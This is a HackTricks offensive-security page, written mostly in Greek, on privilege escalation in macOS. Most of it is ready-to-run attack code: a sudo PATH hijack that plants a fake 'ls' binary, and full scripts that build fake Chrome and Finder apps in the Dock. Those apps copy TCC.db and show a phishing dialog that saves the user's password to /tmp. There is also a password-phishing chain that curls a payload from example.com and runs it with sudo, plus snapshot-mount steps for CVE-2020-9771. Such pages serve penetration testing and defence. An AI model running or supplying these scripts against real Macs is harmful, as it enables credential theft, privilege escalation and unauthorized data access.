# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Αν ήρθατε εδώ αναζητώντας TCC privilege escalation, πηγαίνετε στο:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Παρακαλώ σημειώστε ότι **τα περισσότερα από τα κόλπα σχετικά με την privilege escalation που επηρεάζουν Linux/Unix θα επηρεάσουν επίσης συστήματα MacOS**. Οπότε δείτε:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Αλληλεπίδραση Χρήστη

### Sudo Hijacking

Μπορείτε να βρείτε την αρχική [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να πραγματοποιηθεί αυτή η επίθεση θα ήταν να **hijack other binaries** που το θύμα θα εκτελούσε όταν **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό μάλλον θα έχει εγκατεστημένο το **Homebrew**. Επομένως είναι δυνατό να υποκλέψετε binaries στο **`/opt/homebrew/bin`**.

### Dock Impersonation

Χρησιμοποιώντας λίγη **social engineering** θα μπορούσατε να **υποδυθείτε, για παράδειγμα, το Google Chrome** μέσα στο Dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Μερικές προτάσεις:

- Ελέγξτε στο Dock αν υπάρχει Chrome, και σε αυτή την περίπτωση **αφαιρέστε** αυτή την εγγραφή και **προσθέστε** την **ψεύτικη** **Chrome εγγραφή στην ίδια θέση** στο Dock array.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Μερικές προτάσεις:

- You **cannot remove Finder from the Dock**, οπότε αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε τον ψεύτικο Finder ακριβώς δίπλα στον πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την καταχώρηση του ψεύτικου Finder στην αρχή του Dock array**.
- Μια άλλη επιλογή είναι να μην τοποθετήσετε το εικονίδιο στο Dock και απλώς να το ανοίξετε — "Finder asking to control Finder" δεν είναι τόσο περίεργο.
- Μια ακόμα επιλογή για να **escalate to root without asking** τον κωδικό με ένα άσχημο παράθυρο, είναι να κάνετε τον Finder να ζητήσει πραγματικά τον κωδικό για να εκτελέσει μια προνομιούχα ενέργεια:
- Ζητήστε από τον Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (Το παράθυρο που θα ζητήσει τον κωδικό θα αναφέρει ότι "Finder wants to copy sudo")
- Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα αρχείου ώστε το παράθυρο που ζητά τον κωδικό να αναφέρει ότι "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Το κακόβουλο λογισμικό συχνά καταχράται την αλληλεπίδραση με τον χρήστη για να **αποσπάσει έναν κωδικό που μπορεί να χρησιμοποιηθεί με sudo** και να τον επανχρησιμοποιήσει προγραμματισμένα. Μια κοινή ροή:

1. Προσδιορίστε τον συνδεδεμένο χρήστη με `whoami`.
2. **Επαναλάβετε τις προτροπές κωδικού** μέχρι `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
3. Αποθηκεύστε προσωρινά το διαπιστευτήριο (π.χ., `/tmp/.pass`) και εκτελέστε ενέργειες με προνόμια με `sudo -S` (ο κωδικός μέσω stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ο κλεμμένος κωδικός μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για να **αφαιρέσει την καραντίνα του Gatekeeper με `xattr -c`**, να αντιγράψει LaunchDaemons ή άλλα αρχεία με προνόμια, και να εκτελέσει επιπλέον στάδια μη διαδραστικά.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Οποιοσδήποτε χρήστης** (ακόμη και χρήστες χωρίς προνόμια) μπορεί να δημιουργήσει και να προσαρτήσει ένα snapshot του Time Machine και να **αποκτήσει πρόσβαση ΣΕ ΟΛΑ τα αρχεία** αυτού του snapshot.\
Τα **μόνα προνόμια** που απαιτούνται είναι να έχει η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), τα οποία πρέπει να χορηγηθούν από έναν διαχειριστή.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερής εξήγηση μπορεί να βρεθεί [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Ευαίσθητες Πληροφορίες

Αυτό μπορεί να είναι χρήσιμο για escalate privileges:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Αναφορές

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
